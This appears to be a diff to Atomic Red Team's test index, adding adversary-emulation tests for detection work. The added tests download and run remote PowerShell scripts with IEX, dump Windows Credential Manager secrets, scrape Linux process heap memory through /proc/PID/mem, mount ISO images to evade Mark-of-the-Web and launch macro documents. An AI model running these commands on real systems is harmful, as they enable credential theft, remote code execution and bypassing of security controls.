@@ -1055,6 +1055,32 @@ credential-access:
 
 '
         name: powershell
+    - name: Dump credentials from Windows Credential Manager With PowerShell [windows
+        Credentials]
+      auto_generated_guid: c89becbe-1758-4e7d-a0f4-97d2188a23e3
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1'
+          -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
+    - name: Dump credentials from Windows Credential Manager With PowerShell [web
+        Credentials]
+      auto_generated_guid: 8fd5a296-6772-4766-9991-ff4e92af7240
+      description: This module will extract the credentials from Windows Credential
+        Manager
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1''
+          -UseBasicParsing); Get-CredManCreds -Force
+
+'
   T1555.003:
     technique:
       created: '2020-02-12T18:57:36.041Z'
@@ -4839,7 +4865,106 @@ credential-access:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Linux
-    atomic_tests: []
+      identifier: T1003.007
+    atomic_tests:
+    - name: Dump individual process memory with sh (Local)
+      auto_generated_guid: 7e91138a-8e74-456d-a007-973d67a0bb80
+      description: |
+        Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
+        copy process memory to an external file so it can be searched or exfiltrated later.
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.007.bin"
+        script_path:
+          description: Path to script generating the target process
+          type: Path
+          default: "/tmp/T1003.007.sh"
+        pid_term:
+          description: Unique string to use to identify target process
+          type: String
+          default: T1003.007
+      dependencies:
+      - description: 'Script to launch target process must exist
+
+'
+        prereq_command: |
+          test -f #{script_path}
+          grep "#{pid_term}" #{script_path}
+        get_prereq_command: |
+          echo '#!/bin/sh' > #{script_path}
+          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sh #{script_path}
+          PID=$(pgrep -n -f "#{pid_term}")
+          HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
+          MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
+          MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
+          MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
+          dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+          grep -i "PASS" "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
+
+'
+    - name: Dump individual process memory with Python (Local)
+      auto_generated_guid: 437b2003-a20d-4ed8-834c-4964f24eec63
+      description: |
+        Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
+        copy a process's heap memory to an external file so it can be searched or exfiltrated later.
+      supported_platforms:
+      - linux
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "/tmp/T1003.007.bin"
+        script_path:
+          description: Path to script generating the target process
+          type: Path
+          default: "/tmp/T1003.007.sh"
+        python_script:
+          description: Path to script generating the target process
+          type: Path
+          default: PathToAtomicsFolder/T1003.007/src/dump_heap.py
+        pid_term:
+          description: Unique string to use to identify target process
+          type: String
+          default: T1003.007
+      dependencies:
+      - description: 'Script to launch target process must exist
+
+'
+        prereq_command: |
+          test -f #{script_path}
+          grep "#{pid_term}" #{script_path}
+        get_prereq_command: |
+          echo '#!/bin/sh' > #{script_path}
+          echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
+      - description: 'Requires Python
+
+'
+        prereq_command: "(which python || which python3 || which python2)\n"
+        get_prereq_command: 'echo "Python 2.7+ or 3.4+ must be installed"
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          sh #{script_path}
+          PID=$(pgrep -n -f "#{pid_term}")
+          PYTHON=$(which python || which python3 || which python2)
+          $PYTHON #{python_script} $PID #{output_file}
+          grep -i "PASS" "#{output_file}"
+        cleanup_command: 'rm -f "#{output_file}"
+
+'
   T1606.002:
     technique:
       external_references:
@@ -27216,7 +27341,78 @@ defense-evasion:
       x_mitre_version: '1.0'
       x_mitre_defense_bypassed:
       - Anti-virus, Application control
-    atomic_tests: []
+      identifier: T1553.005
+    atomic_tests:
+    - name: Mount ISO image
+      auto_generated_guid: 002cca30-4778-4891-878a-aaffcfa502fa
+      description: 'Mounts ISO image downloaded from internet to evade Mark-of-the-Web.
+        Upon successful execution, powershell will download the .iso from the Atomic
+        Red Team repo, and mount the image. The provided sample ISO simply has a Reports
+        shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        path_of_iso:
+          description: Path to ISO file
+          type: path
+          default: PathToAtomicsFolder\T1553.005\bin\T1553.005.iso
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'T1553.005.iso must exist on disk at specified location (#{path_of_iso})
+
+'
+        prereq_command: 'if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/T1553.005.iso -OutFile "#{path_of_iso}"
+      executor:
+        command: 'Mount-DiskImage -ImagePath "#{path_of_iso}"
+
+'
+        cleanup_command: 'Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+
+'
+        name: powershell
+    - name: Mount an ISO image and run executable from the ISO
+      auto_generated_guid: 42f22b00-0242-4afc-a61b-0da05041f9cc
+      description: "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web
+        and run hello.exe executable from the ISO. \nUpon successful execution, powershell
+        will download the .iso from the Atomic Red Team repo, mount the image, and
+        run the executable from the ISO image that will open command prompt echoing
+        \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620
+        Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,
+        \ "
+      supported_platforms:
+      - windows
+      input_arguments:
+        path_of_iso:
+          description: Path to ISO file
+          type: path
+          default: PathToAtomicsFolder\T1553.005\bin\FeelTheBurn.iso
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'FeelTheBurn.iso must exist on disk at specified location (#{path_of_iso})
+
+'
+        prereq_command: 'if (Test-Path #{path_of_iso}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{path_of_iso}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1553.005/bin/FeelTheBurn.iso -OutFile "#{path_of_iso}"
+      executor:
+        command: |
+          $keep = Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly
+          $driveLetter = ($keep | Get-Volume).DriveLetter
+          invoke-item "$($driveLetter):\hello.exe"
+        cleanup_command: |
+          Dismount-DiskImage -ImagePath "#{path_of_iso}" | Out-Null
+          Stop-process -name "hello" -Force -ErrorAction ignore
+        name: powershell
   T1036.004:
     technique:
       external_references:
@@ -34289,30 +34485,26 @@ defense-evasion:
     atomic_tests:
     - name: WINWORD Remote Template Injection
       auto_generated_guid: 1489e08a-82c7-44ee-b769-51b72d03521d
-      description: 'Open a .docx file that loads a remote .dotm macro enabled template.
-        Executes the code specified within the .dotm template.Requires download of
-        WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  Opens
-        Calculator.exe when test sucessfully executed, while AV turned off.
-
-'
+      description: "Open a .docx file that loads a remote .dotm macro enabled template
+        from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
+        \nExecutes the code specified within the .dotm template.\nRequires download
+        of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.
+        \ \nDefault docs file opens Calculator.exe when test sucessfully executed,
+        while AV turned off.\n"
       supported_platforms:
       - windows
       input_arguments:
-        docx file:
+        docx_file:
           description: Location of the test docx file on the local filesystem.
           type: Path
           default: PathToAtomicsFolder\T1221\src\Calculator.docx
-        dotm template:
-          description: Location of the test dotm template on the remote server.
-          type: Path
-          default: https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm
       dependency_executor_name: powershell
       dependencies:
       - description: ''
         prereq_command: ''
         get_prereq_command: ''
       executor:
-        command: 'start PathToAtomicsFolder\T1221\src\Calculator.docx
+        command: 'start #{docx_file}
 
 '
         name: command_prompt
@@ -41712,8 +41904,8 @@ persistence:
       - windows
       executor:
         command: |
-          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4
-          if not exist  %APPDATA%\Microsoft\Outlook ( md %APPDATA%\Microsoft\Outlook\ )
+          reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /t REG_DWORD /d 4 /f
+          mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
           echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
         cleanup_command: |
           reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security" /f
@@ -58262,6 +58454,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58323,6 +58516,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58361,6 +58555,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript #{jse_path}`", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
@@ -58398,6 +58593,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
           Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
@@ -58532,6 +58728,7 @@ execution:
 '
       executor:
         command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
           IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing)
           Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
         name: powershell
